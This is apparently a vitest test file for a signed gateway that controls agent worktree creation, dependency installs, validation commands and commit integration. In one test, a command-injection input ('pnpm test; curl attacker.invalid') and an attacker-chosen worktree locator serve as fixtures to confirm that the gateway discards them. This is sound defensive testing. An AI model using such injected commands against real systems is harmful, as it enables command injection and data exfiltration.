import {
  EngineeringCommandProfileSchema,
  EngineeringRepositorySchema,
  EngineeringWorkspaceSchema,
} from "@alexa-control/shared";
import { describe, expect, it, vi } from "vitest";

import type { ExecutionService } from "../execution/service.js";
import type { ExecutionStore } from "../execution/store.js";
import { InMemoryEngineeringRuntimeStore } from "../engineering-runtime/store.js";
import { SignedExecutionEngineeringGateway } from "./signed-gateway.js";
import { EngineeringTransportScopeVerifier } from "../engineering-runtime/transport.js";

const ownerId = "10000000-0000-4000-8000-000000000001";
const companyId = "20000000-0000-4000-8000-000000000002";
const repositoryId = "30000000-0000-4000-8000-000000000003";
const workspaceId = "40000000-0000-4000-8000-000000000004";
const taskId = "50000000-0000-4000-8000-000000000005";
const agentId = "60000000-0000-4000-8000-000000000006";
const now = "2026-09-16T00:00:00.000Z";

const registerNodeProject = (runtime: InMemoryEngineeringRuntimeStore) => {
  runtime.saveRepository(EngineeringRepositorySchema.parse({
    schemaVersion: "1", id: repositoryId, ownerId, companyId,
    displayName: "Portfolio", workspaceLocatorId: "repo-main", defaultBranch: "main",
    protectedBranches: ["main"], protectedPaths: [], generatedPaths: [],
    commandProfileId: "node-default", capabilityProfileId: "engineering-default",
    authorizedAgentIds: [agentId],
    metadata: { languages: ["TypeScript"], packageManagers: ["pnpm"], frameworks: ["React"], importantFiles: ["package.json", "pnpm-lock.yaml"] },
    status: "ACTIVE", createdAt: now, updatedAt: now,
  }));
  runtime.saveCommandProfile(EngineeringCommandProfileSchema.parse({
    schemaVersion: "1", id: "node-default", ownerId, companyId, displayName: "Node",
    commands: [{ id: "lint", executable: "pnpm", args: ["run", "lint"], kind: "LINT", timeoutMs: 60_000, maxOutputBytes: 16_384, networkPolicy: "DENY" }],
    validationOrder: ["lint"], dependencyManager: "pnpm", status: "ACTIVE",
    createdAt: now, updatedAt: now,
  }));
};

const installed = (exitCode: number | null = 0) => ({ output: {
  packageManager: "pnpm", operation: "INSTALL", packages: [], exitCode,
  durationMs: 1, stdout: "", stderr: "", timedOut: false, lockfileChanged: false,
} });

describe("SignedExecutionEngineeringGateway", () => {
  it("retries one unexpected dependency-container exit before marking the worktree ready", async () => {
    const runtime = new InMemoryEngineeringRuntimeStore();
    registerNodeProject(runtime);
    const gateway = new SignedExecutionEngineeringGateway({} as ExecutionService, {} as ExecutionStore, runtime, () => new Date(now));
    const dispatch = vi.spyOn(gateway as unknown as { dispatch: (input: { capability: string }) => Promise<unknown> }, "dispatch")
      .mockResolvedValueOnce({ output: { baseCommit: "a".repeat(40), branch: "main", dirty: false } })
      .mockResolvedValueOnce({ output: {} })
      .mockResolvedValueOnce(installed(null))
      .mockResolvedValueOnce(installed());
    const input = { ownerId, companyId, repositoryId, taskId, agentId, idempotencyKey: taskId, slug: "frontend", transport: { sessionId: crypto.randomUUID(), requestId: crypto.randomUUID(), ipAddress: "127.0.0.1", networkState: "PRIVATE_NETWORK" as const } };
    const created = await gateway.create(input);
    expect(runtime.findWorkspace(ownerId, companyId, created.id)).toMatchObject({ state: "READY", dependenciesPreparedAt: now });
    expect(dispatch.mock.calls.map(([call]) => call.capability)).toEqual([
      "repository.inspect", "repository.worktree_create", "repository.install_dependencies", "repository.install_dependencies",
    ]);
  });

  it("prepares a new isolated worktree before marking it ready", async () => {
    const runtime = new InMemoryEngineeringRuntimeStore();
    registerNodeProject(runtime);
    const gateway = new SignedExecutionEngineeringGateway({} as ExecutionService, {} as ExecutionStore, runtime, () => new Date(now));
    const dispatch = vi.spyOn(gateway as unknown as { dispatch: (input: { capability: string }) => Promise<unknown> }, "dispatch")
      .mockResolvedValueOnce({ output: { baseCommit: "a".repeat(40), branch: "main", dirty: false } })
      .mockResolvedValueOnce({ output: {} })
      .mockResolvedValueOnce(installed());
    const input = { ownerId, companyId, repositoryId, taskId, agentId, idempotencyKey: taskId, slug: "frontend", transport: { sessionId: crypto.randomUUID(), requestId: crypto.randomUUID(), ipAddress: "127.0.0.1", networkState: "PRIVATE_NETWORK" as const } };
    const created = await gateway.create(input);
    expect(runtime.findWorkspace(ownerId, companyId, created.id)).toMatchObject({ state: "READY", dependenciesPreparedAt: now });
    expect(dispatch.mock.calls.map(([call]) => call.capability)).toEqual([
      "repository.inspect", "repository.worktree_create", "repository.install_dependencies",
    ]);
    await gateway.create(input);
    expect(dispatch).toHaveBeenCalledTimes(3);
  });

  it("pins a repair worktree to its registered integrated head and rejects a changed retry base", async () => {
    const runtime = new InMemoryEngineeringRuntimeStore();
    registerNodeProject(runtime);
    const integrationId = crypto.randomUUID();
    const objectiveId = crypto.randomUUID();
    runtime.createWorkspace(EngineeringWorkspaceSchema.parse({
      schemaVersion: "1", id: integrationId, ownerId, companyId, repositoryId,
      taskId: objectiveId, agentId, idempotencyKey: "integration-repair-test",
      branchName: "alexa/integration-repair", worktreeLocator: `ew-${integrationId}`,
      baseCommit: "a".repeat(40), headCommit: null, state: "READY",
      leaseOwner: null, leaseExpiresAt: null, leaseGeneration: 0,
      createdAt: now, updatedAt: now, expiresAt: null,
    }));
    const gateway = new SignedExecutionEngineeringGateway({} as ExecutionService, {} as ExecutionStore, runtime, () => new Date(now));
    const dispatch = vi.spyOn(gateway as unknown as { dispatch: (input: { capability: string; operationInput: Record<string, unknown> }) => Promise<unknown> }, "dispatch")
      .mockResolvedValueOnce({ output: { exists: true, baseCommit: "b".repeat(40), headCommit: "b".repeat(40), branch: "alexa/integration-repair", dirty: false } })
      .mockResolvedValueOnce({ output: { baseCommit: "a".repeat(40), branch: "main", dirty: false } })
      .mockResolvedValueOnce({ output: {} })
      .mockResolvedValueOnce(installed());
    const input = { ownerId, companyId, repositoryId, taskId, agentId, idempotencyKey: taskId,
      slug: "repair", repairBaseCommit: "b".repeat(40), repairIntegrationWorkspaceId: integrationId,
      repairObjectiveId: objectiveId,
      transport: { sessionId: crypto.randomUUID(), requestId: crypto.randomUUID(), ipAddress: "127.0.0.1", networkState: "PRIVATE_NETWORK" as const } };
    const created = await gateway.create(input);
    expect(created.baseCommit).toBe("b".repeat(40));
    expect(dispatch.mock.calls[2]?.[0].operationInput.baseCommit).toBe("b".repeat(40));
    await expect(gateway.create({ ...input, idempotencyKey: "wrong-objective-repair",
      repairObjectiveId: crypto.randomUUID() }))
      .rejects.toMatchObject({ code: "WORKSPACE_NOT_FOUND" });
    await expect(gateway.create({ ...input, repairBaseCommit: "c".repeat(40) }))
      .rejects.toMatchObject({ code: "INCONSISTENT_STATE" });
  });

  it("accepts only an exact task-bound integrated-head repair source", async () => {
    const runtime = new InMemoryEngineeringRuntimeStore();
    registerNodeProject(runtime);
    const integrationId = crypto.randomUUID();
    const objectiveId = crypto.randomUUID();
    const base = "a".repeat(40);
    const repairBase = "b".repeat(40);
    for (const workspace of [
      { id: integrationId, taskId: objectiveId, idempotencyKey: "integration-test", baseCommit: base },
      { id: workspaceId, taskId, idempotencyKey: taskId, baseCommit: repairBase,
        repairIntegrationWorkspaceId: integrationId },
    ]) runtime.createWorkspace(EngineeringWorkspaceSchema.parse({
      schemaVersion: "1", ...workspace, ownerId, companyId, repositoryId, agentId,
      branchName: `alexa/${workspace.taskId.replaceAll("-", "").slice(0, 12)}-123456-repair`,
      worktreeLocator: `ew-${workspace.id}`, headCommit: null, state: "READY",
      leaseOwner: null, leaseExpiresAt: null, leaseGeneration: 0,
      createdAt: now, updatedAt: now, expiresAt: null,
    }));
    const gateway = new SignedExecutionEngineeringGateway({} as ExecutionService, {} as ExecutionStore, runtime, () => new Date(now));
    const enqueue = vi.spyOn(gateway as unknown as { enqueueAndWait: (input: unknown) => Promise<unknown> }, "enqueueAndWait")
      .mockResolvedValue({ schemaVersion: "1", operationId: crypto.randomUUID(),
        capability: "repository.integrate_commit", output: { integrated: true,
          commit: "c".repeat(40), headCommit: "d".repeat(40), conflictPaths: [] } });
    const transport = { sessionId: crypto.randomUUID(), requestId: crypto.randomUUID(),
      ipAddress: "127.0.0.1", networkState: "PRIVATE_NETWORK" as const };
    const request = { ownerId, companyId, repositoryId, workspaceId: integrationId,
      taskId: objectiveId, agentId, capability: "repository.integrate_commit" as const,
      operationInput: { commit: "c".repeat(40), sourceWorkspaceId: workspaceId,
        repairTaskId: taskId, repairBaseCommit: repairBase, expectedHead: repairBase },
      signal: new AbortController().signal, transport };
    await expect(gateway.invoke(request)).resolves.toMatchObject({ output: { integrated: true } });
    expect(enqueue).toHaveBeenCalledTimes(1);
    const signedRequest = (enqueue.mock.calls[0]?.[0] as { request: unknown }).request;
    expect(await new EngineeringTransportScopeVerifier(runtime).verify({ ownerId,
      request: signedRequest as never })).toBe(true);
    const source = runtime.findWorkspace(ownerId, companyId, workspaceId)!;
    runtime.saveWorkspace(EngineeringWorkspaceSchema.parse({ ...source,
      repairIntegrationWorkspaceId: null }));
    expect(await new EngineeringTransportScopeVerifier(runtime).verify({ ownerId,
      request: signedRequest as never })).toBe(false);
    runtime.saveWorkspace(source);
    await expect(gateway.invoke({ ...request, operationInput: { ...request.operationInput,
      repairBaseCommit: "e".repeat(40) } })).rejects.toMatchObject({ code: "WORKSPACE_NOT_FOUND" });
    await expect(gateway.invoke({ ...request, taskId })).rejects.toMatchObject({ code: "WORKSPACE_NOT_FOUND" });
    expect(enqueue).toHaveBeenCalledTimes(1);
  });

  it("does not reuse a CREATING record as a completed worktree after approval interruption", async () => {
    const runtime = new InMemoryEngineeringRuntimeStore();
    registerNodeProject(runtime);
    runtime.createWorkspace(EngineeringWorkspaceSchema.parse({
      schemaVersion: "1", id: workspaceId, ownerId, companyId, repositoryId,
      taskId, agentId, idempotencyKey: taskId, branchName: "alexa/test",
      worktreeLocator: `ew-${workspaceId}`, baseCommit: "a".repeat(40), headCommit: null,
      state: "CREATING", leaseOwner: null, leaseExpiresAt: null, leaseGeneration: 0,
      createdAt: now, updatedAt: now, expiresAt: null,
    }));
    const gateway = new SignedExecutionEngineeringGateway({} as ExecutionService, {} as ExecutionStore, runtime, () => new Date(now));
    const dispatch = vi.spyOn(gateway as unknown as { dispatch: (input: { capability: string }) => Promise<unknown> }, "dispatch")
      .mockRejectedValueOnce(new Error("An exact matching explicit approval is required."))
      .mockResolvedValueOnce({ output: { exists: false, baseCommit: null, headCommit: null, dirty: false, branch: null } })
      .mockResolvedValueOnce({ output: {} })
      .mockResolvedValueOnce(installed());
    const input = {
      ownerId, companyId, repositoryId, taskId, agentId, idempotencyKey: taskId, slug: "test",
      transport: { sessionId: crypto.randomUUID(), requestId: crypto.randomUUID(), ipAddress: "127.0.0.1", networkState: "PRIVATE_NETWORK" as const },
    };
    await expect(gateway.create(input)).rejects.toThrow("explicit approval");
    expect(runtime.findWorkspace(ownerId, companyId, workspaceId)?.state).toBe("CREATING");
    await expect(gateway.create(input)).resolves.toMatchObject({ id: workspaceId });
    expect(runtime.findWorkspace(ownerId, companyId, workspaceId)).toMatchObject({ state: "READY", dependenciesPreparedAt: now });
    expect(dispatch.mock.calls.map(([call]) => call.capability)).toEqual([
      "repository.worktree_inspect", "repository.worktree_inspect", "repository.worktree_create", "repository.install_dependencies",
    ]);
  });

  it("prepares dependencies before offline validation and recovers a created worktree after install failure", async () => {
    const runtime = new InMemoryEngineeringRuntimeStore();
    registerNodeProject(runtime);
    runtime.createWorkspace(EngineeringWorkspaceSchema.parse({
      schemaVersion: "1", id: workspaceId, ownerId, companyId, repositoryId,
      taskId, agentId, idempotencyKey: taskId, branchName: "alexa/test",
      worktreeLocator: `ew-${workspaceId}`, baseCommit: "a".repeat(40), headCommit: null,
      state: "CREATING", leaseOwner: null, leaseExpiresAt: null, leaseGeneration: 0,
      createdAt: now, updatedAt: now, expiresAt: null,
    }));
    const gateway = new SignedExecutionEngineeringGateway({} as ExecutionService, {} as ExecutionStore, runtime, () => new Date(now));
    const dispatch = vi.spyOn(gateway as unknown as { dispatch: (input: { capability: string }) => Promise<unknown> }, "dispatch")
      .mockResolvedValueOnce({ output: { exists: true, baseCommit: "a".repeat(40), headCommit: "a".repeat(40), dirty: false, branch: "alexa/test" } })
      .mockResolvedValueOnce(installed(1))
      .mockResolvedValueOnce({ output: { exists: true, baseCommit: "a".repeat(40), headCommit: "a".repeat(40), dirty: false, branch: "alexa/test" } })
      .mockResolvedValueOnce(installed())
      .mockResolvedValueOnce({ output: { commandId: "lint", exitCode: 0, stdout: "ok", stderr: "", startedAt: now, completedAt: now, durationMs: 1, timedOut: false, cancelled: false, truncated: false, networkIsolated: true } });
    const transport = { sessionId: crypto.randomUUID(), requestId: crypto.randomUUID(), ipAddress: "127.0.0.1", networkState: "PRIVATE_NETWORK" as const };
    const input = { ownerId, companyId, repositoryId, taskId, agentId, idempotencyKey: taskId, slug: "test", transport };
    await expect(gateway.create(input)).rejects.toThrow("Governed dependency preparation failed");
    expect(runtime.findWorkspace(ownerId, companyId, workspaceId)).toMatchObject({ state: "CREATING", dependenciesPreparedAt: null });
    await expect(gateway.create(input)).resolves.toMatchObject({ id: workspaceId });
    const validation = await gateway.invoke({ ownerId, companyId, repositoryId, workspaceId, taskId, agentId, capability: "repository.validate", operationInput: {}, signal: new AbortController().signal, transport });
    expect("validationStatus" in validation && validation.validationStatus).toBe("PASS");
    expect(dispatch.mock.calls.map(([call]) => call.capability)).toEqual([
      "repository.worktree_inspect", "repository.install_dependencies", "repository.worktree_inspect", "repository.install_dependencies", "repository.run_command",
    ]);
  });
  it("resolves a registered command server-side and enqueues the finite request through the existing signed transport", async () => {
    const runtime = new InMemoryEngineeringRuntimeStore();
    runtime.saveRepository(
      EngineeringRepositorySchema.parse({
        schemaVersion: "1",
        id: repositoryId,
        ownerId,
        companyId,
        displayName: "Repository",
        workspaceLocatorId: "repo-main",
        defaultBranch: "main",
        protectedBranches: ["main"],
        protectedPaths: [],
        generatedPaths: [],
        commandProfileId: "node-default",
        capabilityProfileId: "engineering-default",
        authorizedAgentIds: [agentId],
        metadata: {
          languages: ["TypeScript"],
          packageManagers: ["pnpm"],
          frameworks: [],
          importantFiles: ["package.json"],
        },
        status: "ACTIVE",
        createdAt: now,
        updatedAt: now,
      }),
    );
    runtime.saveCommandProfile(
      EngineeringCommandProfileSchema.parse({
        schemaVersion: "1",
        id: "node-default",
        ownerId,
        companyId,
        displayName: "Node",
        commands: [
          {
            id: "test",
            executable: "pnpm",
            args: ["test"],
            kind: "TEST",
            timeoutMs: 60_000,
            maxOutputBytes: 16_384,
            networkPolicy: "DENY",
          },
        ],
        validationOrder: ["test"],
        dependencyManager: "pnpm",
        status: "ACTIVE",
        createdAt: now,
        updatedAt: now,
      }),
    );
    runtime.createWorkspace(
      EngineeringWorkspaceSchema.parse({
        schemaVersion: "1",
        id: workspaceId,
        ownerId,
        companyId,
        repositoryId,
        taskId,
        agentId,
        idempotencyKey: taskId,
        branchName: "alexa/500000000000-000004-backend",
        worktreeLocator: `ew-${workspaceId}`,
        baseCommit: "a".repeat(40),
        headCommit: null,
        state: "READY",
        leaseOwner: null,
        leaseExpiresAt: null,
        leaseGeneration: 0,
        createdAt: now,
        updatedAt: now,
        expiresAt: null,
      }),
    );
    let transportRequest: Record<string, unknown> | undefined;
    let executionInput:
      | {
          ownerId: string;
          sessionId: string;
          requestId: string;
          networkState: string;
          request: Record<string, unknown>;
        }
      | undefined;
    const createEngineeringExecution = vi.fn(
      (input: {
        ownerId: string;
        sessionId: string;
        requestId: string;
        networkState: string;
        request: Record<string, unknown>;
      }) => {
        executionInput = input;
        transportRequest = input.request;
        return Promise.resolve({ id: "execution-1" });
      },
    );
    const executionStore = {
      getResult: vi.fn(() =>
        Promise.resolve({
          status: "SUCCEEDED",
          result: {
            schemaVersion: "1",
            operationId: transportRequest?.operationId,
            capability: transportRequest?.capability,
            output:
              transportRequest?.capability === "repository.install_dependencies"
                ? installed().output
                : transportRequest?.capability === "repository.integrate_commit"
                ? {
                    integrated: true,
                    commit: "b".repeat(40),
                    headCommit: "c".repeat(40),
                    conflictPaths: [],
                  }
                : {
                    commandId: "test",
                    exitCode: 0,
                    stdout: "ok",
                    stderr: "",
                    startedAt: now,
                    completedAt: now,
                    durationMs: 1,
                    timedOut: false,
                    cancelled: false,
                    truncated: false,
                    networkIsolated: true,
                  },
          },
        }),
      ),
      find: vi.fn(),
      cancel: vi.fn(),
      list: vi.fn(() => Promise.resolve([])),
    };
    const gateway = new SignedExecutionEngineeringGateway(
      { createEngineeringExecution } as unknown as ExecutionService,
      executionStore as unknown as ExecutionStore,
      runtime,
      () => new Date(now),
      1_000,
    );
    const result = await gateway.invoke({
      ownerId,
      companyId,
      repositoryId,
      workspaceId,
      taskId,
      agentId,
      capability: "repository.run_command",
      operationInput: {
        commandId: "test",
        command: "pnpm test; curl attacker.invalid",
      },
      signal: new AbortController().signal,
      transport: {
        sessionId: "70000000-0000-4000-8000-000000000007",
        requestId: "80000000-0000-4000-8000-000000000008",
        ipAddress: "100.64.0.1",
        networkState: "PRIVATE_NETWORK",
      },
    });
    expect(createEngineeringExecution).toHaveBeenCalledOnce();
    expect(executionInput).toMatchObject({
      ownerId,
      sessionId: "70000000-0000-4000-8000-000000000007",
      networkState: "PRIVATE_NETWORK",
    });
    expect(executionInput?.requestId).toBe(transportRequest?.requestId);
    expect(transportRequest).toMatchObject({
      companyId,
      repositoryId,
      engineeringWorkspaceId: workspaceId,
      agentId,
      capability: "repository.run_command",
      input: {
        command: {
          id: "test",
          executable: "pnpm",
          args: ["test"],
          networkPolicy: "DENY",
        },
      },
    });
    expect(JSON.stringify(transportRequest)).not.toContain("attacker.invalid");
    expect(result.output).toMatchObject({ commandId: "test", exitCode: 0 });

    const dependencyResult = await gateway.invoke({
      ownerId, companyId, repositoryId, workspaceId, taskId, agentId,
      capability: "repository.install_dependencies",
      operationInput: { packageManager: "npm" },
      signal: new AbortController().signal,
      transport: { sessionId: crypto.randomUUID(), requestId: crypto.randomUUID(), ipAddress: "100.64.0.1", networkState: "PRIVATE_NETWORK" },
    });
    expect(transportRequest).toMatchObject({
      engineeringWorkspaceId: workspaceId,
      capability: "repository.install_dependencies",
      input: { packageManager: "pnpm" },
    });
    expect(await new EngineeringTransportScopeVerifier(runtime).verify({ ownerId, request: transportRequest as never })).toBe(true);
    expect(dependencyResult.output).toMatchObject({ operation: "INSTALL", exitCode: 0, lockfileChanged: false });

    const integrationWorkspaceId = crypto.randomUUID();
    const objectiveId = crypto.randomUUID();
    runtime.createWorkspace(
      EngineeringWorkspaceSchema.parse({
        schemaVersion: "1",
        id: integrationWorkspaceId,
        ownerId,
        companyId,
        repositoryId,
        taskId: objectiveId,
        agentId,
        idempotencyKey: "integration-test",
        branchName: "alexa/integration-test",
        worktreeLocator: `ew-${integrationWorkspaceId}`,
        baseCommit: "a".repeat(40),
        headCommit: null,
        state: "READY",
        leaseOwner: null,
        leaseExpiresAt: null,
        leaseGeneration: 0,
        createdAt: now,
        updatedAt: now,
        expiresAt: null,
      }),
    );
    await gateway.invoke({
      ownerId,
      companyId,
      repositoryId,
      workspaceId: integrationWorkspaceId,
      taskId: objectiveId,
      agentId,
      capability: "repository.integrate_commit",
      operationInput: {
        commit: "b".repeat(40),
        sourceWorkspaceId: workspaceId,
        sourceWorktreeLocator: "attacker-selected",
      },
      signal: new AbortController().signal,
      transport: {
        sessionId: "70000000-0000-4000-8000-000000000007",
        requestId: "80000000-0000-4000-8000-000000000008",
        ipAddress: "100.64.0.1",
        networkState: "PRIVATE_NETWORK",
      },
    });
    expect(transportRequest).toMatchObject({
      taskId: objectiveId,
      engineeringWorkspaceId: integrationWorkspaceId,
      capability: "repository.integrate_commit",
      input: {
        commit: "b".repeat(40),
        sourceWorkspaceId: workspaceId,
        sourceWorktreeLocator: `ew-${workspaceId}`,
      },
    });
    expect(
      await new EngineeringTransportScopeVerifier(runtime).verify({
        ownerId,
        request: transportRequest as never,
      }),
    ).toBe(true);
    expect(
      await new EngineeringTransportScopeVerifier(runtime).verify({
        ownerId,
        request: {
          ...transportRequest,
          input: {
            ...(transportRequest?.input as object),
            sourceWorktreeLocator: "ew-00000000-0000-4000-8000-000000000000",
          },
        } as never,
      }),
    ).toBe(false);
  });
});
